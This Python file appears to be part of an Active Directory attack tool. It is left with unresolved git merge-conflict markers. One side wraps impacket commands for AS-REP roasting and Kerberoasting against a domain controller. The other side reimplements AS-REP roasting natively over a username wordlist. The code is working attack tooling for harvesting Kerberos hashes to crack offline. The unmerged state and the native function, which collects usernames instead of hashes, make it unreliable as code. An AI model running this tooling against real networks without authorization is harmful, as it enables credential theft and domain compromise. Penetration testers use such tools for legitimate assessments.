<<<<<<< HEAD
import subprocess
from core import aux

def unauthenticated_asrep(target, domain, wordlist):

    cmd = [
        "impacket-GetNPUsers",
        f"{domain.upper()}/",
        "-dc-ip", target,
        "-usersfile", wordlist,
        "-format", "hashcat",
        "-no-pass"
    ]

    output = aux.run_command(cmd)
    return output

def kerberoast(target, domain):

    cmd = [
        "impacket-GetUserSPNs",
        "-request",
        "-dc-ip", target,
        f"{domain.upper()}/"
    ]

    output = aux.run_command(cmd)

    return output
=======
import logging
from impacket.krb5 import kerberosv5
from impacket.krb5 import constants
from colorama import Fore, Style

logging.getLogger("impacket").setLevel(logging.ERROR)

def native_asrep_roasting(target, domain, wordlist_path):
  
    hashes = []
    try:
        with open(wordlist_path, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[- ] Error reading wordlist: {e}{Style.RESET_ALL}")
        return []

    print(f"[*] Testing {len(users)} users for AS-REP Roasting...")

    for user in users:
        try:
            kerberosv5.getKerberosASREP(user, domain, None, target, target)
            
            print(f"{Fore.GREEN}[+] Vulnerable user found: {user}{Style.RESET_ALL}")
            hashes.append(user)
        except Exception as e:
            print(f"{Fore.RED}[-] User {user} not AS-REProastable {Style.RESET_ALL}")
            error_code = getattr(e, 'error_code', None)
            if error_code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                continue
            elif error_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                continue
            else:
                pass
    return hashes

>>>>>>> 49bd065 (Refactor some functionality to native impacket library)
